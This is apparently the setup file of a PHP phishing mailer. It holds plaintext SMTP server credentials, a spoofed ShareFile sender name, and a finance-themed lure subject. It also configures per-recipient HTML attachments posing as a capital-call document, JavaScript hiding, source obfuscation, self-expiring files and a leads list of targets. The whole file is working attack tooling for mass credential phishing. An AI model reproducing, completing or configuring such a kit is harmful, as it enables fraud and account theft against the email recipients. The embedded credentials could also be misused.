<?php

///////////////<- Start setup...
//////// ----> SMTP info.
$smtps = "mail.towne-pk.com";
$nakedsmtpuser = "towne@towne-pk.com";
$smtppass = "aleena5256b";
$smtpauth = true;
$smtpport = 25;

/////// ---> Headers info.
$nakedfrom = "towne@towne-pk.com";
$nakedname = "[{random4}] {frmsite}ShareFile-Service";
$nakedsubject = '[{time}] : Shared - Document : "{frmsite} Finance Q1 Capital call pre-Request.doc for {email}" - ';
$Priority = 1;

////////////<- want to send attach focus here.....
$useatt = true;
$log_filename = "attachs";
$filename = "{frmsite} Finance Q1 Capital call pre-Request.doc for {email} File{random}.html"; /////<--- special name for each email 
$javaescape = true;  /////<--- Hide with java

///////////-----> Encrypt html source
$obsfucate = true;
$setexpire = '+30 day'; //$setexpire this is how log you want your file open before destroyed....
// Leave empty if no idea
// '+10 day' expires after 10 days, 
// 'Next Friday' Expires next Friday, 
// 'tomorrow' Expires tomorrow, 
// '+5 hours' Expires after 5 hours, 
// '+1 week 3 days 7 hours 5 seconds' Expires after +1 week 3 days 7 hours and 5 seconds.

////// MEsaage
$nakedbody = (file_get_contents('message.html'));
$encrymsg = false;
$leads=file('leads.txt');

///use medification codes
// {email} --> username@domain.com
// {date} --> Saturday, April 17, 2021;
// {time} --> 8:24 am;
// {base64email} email in base 64 format;
// {hexemail} email inhexadecimal format;
// {domain} --> domain.com;
// {frmsite} --> Domain;
// {mename} --> Username;
// {username}  --> Username;
// {user} --> Username;
// {random} --> 48G72d0 generate random codes
// {number} --> 6386534 Generate random numbers

///////////<---- End setup...